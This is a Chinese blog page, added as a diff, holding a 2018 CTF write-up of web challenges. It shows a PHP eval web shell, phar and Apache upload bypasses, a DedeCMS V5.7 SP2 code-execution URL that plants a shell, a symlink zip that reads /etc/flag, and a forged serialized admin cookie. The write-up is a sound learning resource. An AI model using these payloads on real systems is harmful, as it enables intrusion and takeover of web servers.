@@ -1,0 +1,488 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="baidu-site-verification" content="5ZQsOe30cm" />
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 6.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" integrity="sha256-HtsXJanqjKTc8vVQjO4YMhiqFoXkfBsjBWcX91T1jr8=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"southsea.st","root":"/","images":"/images","scheme":"Gemini","darkmode":true,"version":"8.17.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":false,"style":"mac"},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":"disqusjs","storage":true,"lazyload":false,"nav":null,"activeClass":"disqusjs"},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="首发于安恒网络空间安全讲武堂，第一次投稿，不足之处还请海涵Orz。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2018 全国大学生软件测试大赛 安恒杯Web测试大赛 省赛 部分题解">
+<meta property="og:url" content="https://southsea.st/2018-AH-Provincial-Competition/index.html">
+<meta property="og:site_name" content="南溟NaN">
+<meta property="og:description" content="首发于安恒网络空间安全讲武堂，第一次投稿，不足之处还请海涵Orz。">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2018-11-07T00:00:00.000Z">
+<meta property="article:modified_time" content="2025-01-24T03:34:53.067Z">
+<meta property="article:author" content="南溟NaN">
+<meta property="article:tag" content="安恒">
+<meta property="article:tag" content="Web">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="文件上传">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="canonical" href="https://southsea.st/2018-AH-Provincial-Competition/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://southsea.st/2018-AH-Provincial-Competition/","path":"2018-AH-Provincial-Competition/","title":"2018 全国大学生软件测试大赛 安恒杯Web测试大赛 省赛 部分题解"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>2018 全国大学生软件测试大赛 安恒杯Web测试大赛 省赛 部分题解 | 南溟NaN</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">南溟NaN</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">在这浩瀚星河的你是什么</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">24</span></a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类<span class="badge">5</span></a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">68</span></a></li><li class="menu-item menu-item-links"><a href="/links/" rel="section"><i class="fa fa-link fa-fw"></i>友链</a></li><li class="menu-item menu-item-sitemap"><a href="/sitemap.xml" rel="section"><i class="fa fa-sitemap fa-fw"></i>站点地图</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup"><div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" maxlength="80"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close" role="button">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="search-result-container no-result">
+  <div class="search-result-icon">
+    <i class="fa fa-spinner fa-pulse fa-5x"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B8%B8%E8%A7%84%E6%93%8D%E4%BD%9C"><span class="nav-number">1.</span> <span class="nav-text">常规操作</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%80%81%E5%88%86%E7%9A%84md5"><span class="nav-number">2.</span> <span class="nav-text">送分的md5</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#a_a"><span class="nav-number">3.</span> <span class="nav-text">!!!A_A</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AE%80%E5%8D%95%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="nav-number">4.</span> <span class="nav-text">简单文件上传</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%96%B0%E7%9A%84%E6%96%B0%E9%97%BB%E6%90%9C%E7%B4%A2"><span class="nav-number">5.</span> <span class="nav-text">新的新闻搜索</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%9C%9F%E7%9A%84%E6%98%AFdedecms"><span class="nav-number">6.</span> <span class="nav-text">真的是dedecms</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#get-flag"><span class="nav-number">7.</span> <span class="nav-text">get flag</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%8D%E4%B8%80%E6%A0%B7%E7%9A%84%E4%B8%8A%E4%BC%A0%E7%B3%BB%E7%BB%9F"><span class="nav-number">8.</span> <span class="nav-text">不一样的上传系统</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%8D%E4%B8%80%E8%88%AC%E7%9A%84%E6%B3%A8%E5%85%A5"><span class="nav-number">9.</span> <span class="nav-text">不一般的注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%A7%98%E5%AF%86%E7%9A%84%E7%B3%BB%E7%BB%9F"><span class="nav-number">10.</span> <span class="nav-text">秘密的系统</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="南溟NaN"
+      src="https://avatars.githubusercontent.com/u/34373144?v=4">
+  <p class="site-author-name" itemprop="name">南溟NaN</p>
+  <div class="site-description" itemprop="description">在这浩瀚星河的你是什么</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">68</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">5</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">24</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/southseast" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;southseast" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:st.southsea@gmail.com" title="E-Mail → mailto:st.southsea@gmail.com" rel="noopener me" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+        </div>
+      </div>
+        <div class="back-to-top animated" role="button" aria-label="返回顶部">
+          <i class="fa fa-arrow-up"></i>
+          <span>0%</span>
+        </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://southsea.st/2018-AH-Provincial-Competition/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="https://avatars.githubusercontent.com/u/34373144?v=4">
+      <meta itemprop="name" content="南溟NaN">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="南溟NaN">
+      <meta itemprop="description" content="在这浩瀚星河的你是什么">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="2018 全国大学生软件测试大赛 安恒杯Web测试大赛 省赛 部分题解 | 南溟NaN">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          2018 全国大学生软件测试大赛 安恒杯Web测试大赛 省赛 部分题解
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2018-11-07 00:00:00" itemprop="dateCreated datePublished" datetime="2018-11-07T00:00:00+00:00">2018-11-07</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E9%A2%98%E8%A7%A3/" itemprop="url" rel="index"><span itemprop="name">题解</span></a>
+        </span>
+    </span>
+
+  
+    <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv">
+      <span class="post-meta-item-icon">
+        <i class="far fa-eye"></i>
+      </span>
+      <span class="post-meta-item-text">阅读次数：</span>
+      <span id="busuanzi_value_page_pv"></span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><p>首发于<a
+target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s?__biz=MzU1MzE3Njg2Mw==&amp;mid=2247485763&amp;idx=1&amp;sn=c8c511e4366a5287d0340c97ec65d6ef&amp;chksm=fbf79333cc801a25fdaf0b496007a9a002278dcad319168d70752635b4895686f2537af0bd27&amp;mpshare=1&amp;scene=23&amp;srcid=1106h6wthblgluSmnOfhR3VD#rd">安恒网络空间安全讲武堂</a>，第一次投稿，不足之处还请海涵<strong>Orz</strong>。</p>
+<span id="more"></span>
+<h3 id="常规操作">常规操作</h3>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">常规操作，试一试 http://114.55.36.69:8009/</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">只允许上传jpg、png、gif、rar、zip文件类型！</span><br></pre></td></tr></table></figure>
+<p>看到<strong>zip</strong>于是猜测是<strong>phar://</strong>伪协议读取。</p>
+<p>于是写个小马打包成<strong>zip</strong>文件传上去。</p>
+<p>例如我写的是<strong>south.php</strong>。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;south&#x27;</span>]);</span><br><span class="line">    <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>然后压缩成<strong>south.zip</strong>，那么需要访问以下链接。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://114.55.36.69:8009/index.php?url=phar://upload/5a722d46033ecd25d5ce0f13a0e7d8ec.zip/south</span><br></pre></td></tr></table></figure>
+<p>随后连接小马，读到<strong>flag{a5aa012546a729eebaeaa768883beb23}</strong>。</p>
+<h3 id="送分的md5">送分的md5</h3>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">怎么还有md5 http://114.55.36.69:8000</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">md5 crash?&lt;!--$_POST[&#x27;data1&#x27;]!== $_POST[&#x27;data2&#x27;]&amp;&amp;md5($_POST[&#x27;data1&#x27;])===md5($_POST[&#x27;data2&#x27;] --&gt;fail</span><br></pre></td></tr></table></figure>
+<p>很简单的<strong>md5</strong>绕过，构造如下<strong>payload</strong>。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data1[]=QNKCDZO&amp;data2[]=s1091221200a</span><br></pre></td></tr></table></figure>
+<p>得到<strong>flag{d9686516f1bafb5acdb3e98db62e17422}</strong>。</p>
+<h3 id="a_a">!!!A_A</h3>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!!!A_A !!!-_- http://114.55.36.69:8001/</span><br></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>); </span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_error&quot;</span>, <span class="literal">false</span>);  </span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);  </span><br><span class="line"><span class="variable">$str</span> = <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;A_A&#x27;</span>])?<span class="variable">$_GET</span>[<span class="string">&#x27;A_A&#x27;</span>]:<span class="string">&#x27;A_A&#x27;</span>; </span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>], <span class="string">&quot;A_A&quot;</span>) !==<span class="literal">false</span>) &#123; </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;A_A,have fun&#x27;</span>; </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">elseif</span> (<span class="variable">$str</span>&lt;<span class="number">9999999999</span>) &#123; </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;A_A,too small&#x27;</span>; </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">elseif</span> ((<span class="keyword">string</span>)<span class="variable">$str</span>&gt;<span class="number">0</span>) &#123; </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;A_A,too big&#x27;</span>; </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">else</span>&#123; </span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;flag.php&#x27;</span>); </span><br><span class="line">     </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"> <span class="meta">?&gt;</span> A_A,too small</span><br></pre></td></tr></table></figure>
+<p>这题考过很多次了。</p>
+<p>这里的知识点是当代码中存在<strong>$<em>REQUEST['user_id']<strong>里面类似的参数的时候，使用</strong>"
+"、"["、"+"、"."<strong>这样的符号的时候回自动转化成</strong>"</em>"</strong>从而造成绕过。</p>
+<p>例如构造一个<strong>?user_id=1&amp;user.id=2</strong>。
+那么<strong>waf</strong>检测到的就是<strong>2</strong>而插入数据库的却是<strong>1</strong>。</p>
+<p>而数组比所有数字都大，而字符串在强转比较的时候为<strong>0</strong>，因此构造如下<strong>payload</strong>。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?A.A[]=a</span><br></pre></td></tr></table></figure>
+<p>得到<strong>flag={09bc24026c987ae44a6e424479b2e3}</strong>。</p>
+<h3 id="简单文件上传">简单文件上传</h3>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">简单文件上传，多试试 http://114.55.36.69:8015</span><br></pre></td></tr></table></figure>
+<p>尝试多次，发现是检测文件头来判断文件类型，那么使用图马可以绕过上传限制。</p>
+<p>命名为<strong>south.jpg.php</strong>可以成功上传。</p>
+<p>提示如下。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uploads/17d4aa23e1d7c8cf1c176485d71effe7b35bdec3/south.peg.php succesfully uploaded！</span><br></pre></td></tr></table></figure>
+<p>然后连接图马就可以读到<strong>flag{e0662bb5114da4e42b4185ed12dee2f3}</strong>。</p>
+<h3 id="新的新闻搜索">新的新闻搜索</h3>
+<p>这个直接用<strong>sqlmap</strong>跑<strong>post</strong>注入就可以了【因为懒得手注，也不再做过度赘述。</p>
+<h3 id="真的是dedecms">真的是dedecms</h3>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">放出来好几天的东西，随便玩玩 http://114.55.36.69:8008</span><br></pre></td></tr></table></figure>
+<p><a
+target="_blank" rel="noopener" href="https://www.freebuf.com/vuls/164035.html">参考<strong>DedeCMS V5.7
+SP2</strong>后台存在代码执行漏洞</a>。</p>
+<p>后台<strong>admin</strong>弱密码。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://114.55.36.69:8008/dede/tpl.php?action=upload</span><br></pre></td></tr></table></figure>
+<p>在页面源代码中获取到<strong>token</strong>值。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input name=&#x27;token&#x27; type=&#x27;hidden&#x27; value=&#x27;9ffadcfa24f99fb459bdab3cae23b0b2&#x27;  /&gt;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://114.55.36.69:8008/dede/tpl.php?filename=moonsec.lib.php&amp;action=savetagfile&amp;content=%3C?php%20eval($_POST[&#x27;south&#x27;]);?%3E&amp;token=622f67f063ae730dbe33771c582ab3dd</span><br></pre></td></tr></table></figure>
+<p>然后就能用如下页面连接小马。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://114.55.36.69:8008/include/taglib/moonsec.lib.php</span><br></pre></td></tr></table></figure>
+<p>得到<strong>flag{1de3ce6607a0f95as1861c4bbb3687b8}</strong>。</p>
+<h3 id="get-flag">get flag</h3>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag在/etc/flag http://114.55.36.69:8003/</span><br></pre></td></tr></table></figure>
+<p><strong>admin</strong>弱密码登陆，提示如下。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Welcome admin 退出查看压缩的flag. 路径为 /etc/flag</span><br></pre></td></tr></table></figure>
+<p>大概是会解压传上去的压缩文件，然后读取里面的内容，于是使用<strong>ln</strong>软连接。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ln -s /etc/flag test</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">zip -y 1.zip test</span><br></pre></td></tr></table></figure>
+<p>然后上传打包后的软连接文件得到<strong>flag{1de3ce6607a0f95as1861c4bbb3687b6}</strong>。</p>
+<h3 id="不一样的上传系统">不一样的上传系统</h3>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://114.55.36.69:8002/</span><br></pre></td></tr></table></figure>
+<p>似乎是新瓶装旧酒的原题，安恒一月月赛的题目，不再做过多赘述。</p>
+<p><a
+target="_blank" rel="noopener" href="http://skysec.top/2018/01/22/2018%E5%AE%89%E6%81%92%E4%B8%80%E6%9C%88%E6%9C%88%E8%B5%9B%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/#%E6%96%B0%E7%93%B6%E8%A3%85%E6%97%A7%E9%85%92">一叶飘零师傅的博客</a>有讲述。</p>
+<p>这里抄【并改一下原话。</p>
+<p><strong>Apache</strong>存在解析漏洞。<strong>Apache</strong>是从右到左开始判断解析，如果为不可识别解析，就再往左判断。</p>
+<p>所以我们准备脚本<strong>south.php.png</strong>小马压缩成压缩包上传即可拿到<strong>shell</strong>，我们的<strong>png</strong>会被解析为php。</p>
+<p>但是这里有一个小绕过，因为会删除带有php的文件。</p>
+<p>但是这里过滤不严谨，PHP大写即可绕过，最后成功拿到shell，获得flag。</p>
+<p>所以最终写小马重命名并打包上传<strong>south1.PHP.png.zip</strong>，然后得到路径。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/upload/cf417e3635d8414f1621a0e945a68702/south1.PHP.png</span><br><span class="line">/upload/cf417e3635d8414f1621a0e945a68702/__MACOSX/._south1.PHP.png</span><br></pre></td></tr></table></figure>
+<p>连接就可以得到最终的<strong>flag</strong>。</p>
+<h3 id="不一般的注入">不一般的注入</h3>
+<p>太菜了，这题没做出来Orz。</p>
+<h3 id="秘密的系统">秘密的系统</h3>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">不久前才开发的系统，功能也还不完善，代码也还有待改进 http://114.55.36.69:8014/</span><br></pre></td></tr></table></figure>
+<p>看到一个<strong>Upload</strong>，点进去提示<strong>您不是管理员，无法使用此功能</strong>。</p>
+<p>登陆界面也不能正常访问，习惯性的翻看<strong>robots.txt</strong>得到如下信息。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Disallow: index.php?r=site/loginuser_1</span><br></pre></td></tr></table></figure>
+<p>于是进入登录界面。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"> &lt;!--</span><br><span class="line">*** author: cib_zhinianyuxin.com</span><br><span class="line">*** code: github.com</span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure>
+<p>给出了作者<strong>github</strong>的一些信息，翻看<strong>github</strong>，得到一个登陆账号密码<strong>test/cib_sec</strong>，以及<strong>cookie</strong>生成的函数。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">secret-system</span><br><span class="line">##README.md</span><br><span class="line"></span><br><span class="line">*** author: cib_zhinianyuxin.com</span><br><span class="line"></span><br><span class="line">It&#x27;s just a system which is not completed , there are some tips:</span><br><span class="line"></span><br><span class="line">you can use test/cib_sec to login ,but you are not admin!</span><br><span class="line">only admin can upload file ,but whichone can not bypass my rules.</span><br><span class="line">/**</span><br><span class="line">$sign = array(</span><br><span class="line">                    &#x27;id&#x27;=&gt;$model-&gt;id,</span><br><span class="line">                    &#x27;name&#x27;=&gt;$model-&gt;username,</span><br><span class="line">                    &#x27;sign&#x27;=&gt;md5($model-&gt;id.$model-&gt;username),</span><br><span class="line">                );</span><br><span class="line">$_COOKIE[&#x27;cib&#x27;] = serialize($sign);</span><br><span class="line">**/</span><br></pre></td></tr></table></figure>
+<p>登陆测试账号后，<strong>Google</strong>插件<strong>EditThisCookie</strong>可以查看该账号的<strong>cib
+cookie</strong>是<strong>url</strong>编码的。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a%3A3%3A%7Bs%3A2%3A%22id%22%3Bi%3A2%3Bs%3A4%3A%22name%22%3Bs%3A4%3A%22test%22%3Bs%3A4%3A%22sign%22%3Bs%3A32%3A%227cbab5cea99169139e7e6d8ff74ebb77%22%3B%7D</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:3:&#123;s:2:&quot;id&quot;;i:2;s:4:&quot;name&quot;;s:4:&quot;test&quot;;s:4:&quot;sign&quot;;s:32:&quot;7cbab5cea99169139e7e6d8ff74ebb77&quot;;&#125;</span><br></pre></td></tr></table></figure>
+<p>解码后发现可以构造<strong>cib
+cookie</strong>，改<strong>i</strong>为<strong>1</strong>，<strong>test</strong>为<strong>admin</strong>，最后的<strong>md5</strong>编码<strong>1.admin</strong>得到<strong>6c5de1b510e8bdd0bc40eff99dcd03f8</strong>，于是得到如下<strong>cookie</strong>。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:3:&#123;s:2:&quot;id&quot;;i:1;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:4:&quot;sign&quot;;s:32:&quot;6c5de1b510e8bdd0bc40eff99dcd03f8&quot;;&#125;</span><br></pre></td></tr></table></figure>
+<p>再<strong>url</strong>编码后修改<strong>cookie</strong>。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%61%3a%33%3a%7b%73%3a%32%3a%22%69%64%22%3b%69%3a%31%3b%73%3a%34%3a%22%6e%61%6d%65%22%3b%73%3a%35%3a%22%61%64%6d%69%6e%22%3b%73%3a%34%3a%22%73%69%67%6e%22%3b%73%3a%33%32%3a%22%36%63%35%64%65%31%62%35%31%30%65%38%62%64%64%30%62%63%34%30%65%66%66%39%39%64%63%64%30%33%66%38%22%3b%7d</span><br></pre></td></tr></table></figure>
+<p>然后成功升级成为管理员。</p>
+<p>一个文件上传，<strong>Apache2.2.15</strong>漏洞解析，上传文件抓包改后缀名为<strong>.php.jpg</strong>。</p>
